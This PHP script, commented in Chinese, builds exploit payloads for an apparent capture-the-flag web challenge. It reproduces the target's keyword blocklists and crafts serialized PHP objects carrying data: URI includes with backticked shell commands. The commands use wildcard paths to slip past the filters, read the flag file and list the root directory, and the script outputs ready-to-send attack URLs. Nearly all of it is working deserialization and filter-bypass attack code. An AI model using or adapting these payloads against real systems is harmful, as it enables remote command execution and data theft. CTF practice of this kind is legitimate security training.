<?php
// 生成exploit payload

$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function ($item) {
    return preg_quote($item, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function ($item) {
    return preg_quote($item, '/'); }, $blocked_b)) . '/i';

function check($a, $b, $pattern_a, $pattern_b)
{
    if (preg_match($pattern_a, $a)) {
        echo "FAIL: a blocked\n";
        return false;
    }
    if (preg_match($pattern_b, $b)) {
        echo "FAIL: b blocked\n";
        return false;
    }
    echo "PASS: Both checks passed\n";
    return true;
}

// 方案1：使用通配符读取flag
echo "=== Payload 1: wildcard cat ===\n";
$a1 = ';include("data:,<?=`/???/???%20/????`;");';
$b1 = '//';
echo "a: $a1\n";
echo "b: $b1\n";
check($a1, $b1, $pattern_a, $pattern_b);

$ser1 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a1) . ':"' . $a1 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b1) . ':"' . $b1 . '";}';
$url1 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser1);
echo "URL: $url1\n\n";

// 方案2：列出根目录
echo "=== Payload 2: ls root ===\n";
$a2 = ';include("data:,<?=`/*`;");';
$b2 = '//';
echo "a: $a2\n";
echo "b: $b2\n";
check($a2, $b2, $pattern_a, $pattern_b);

$ser2 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a2) . ':"' . $a2 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b2) . ':"' . $b2 . '";}';
$url2 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser2);
echo "URL: $url2\n\n";

// 方案3：使用base64
echo "=== Payload 3: base64 ===\n";
$a3 = ';include("data:,<?=`/???/????64%20/????`;");';
$b3 = '//';
echo "a: $a3\n";
echo "b: $b3\n";
check($a3, $b3, $pattern_a, $pattern_b);

$ser3 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a3) . ':"' . $a3 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b3) . ':"' . $b3 . '";}';
$url3 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser3);
echo "URL: $url3\n\n";

// 保存URLs
file_put_contents('payload_urls.txt', "Payload 1:\n$url1\n\nPayload 2:\n$url2\n\nPayload 3:\n$url3\n");
echo "URLs saved to payload_urls.txt\n";
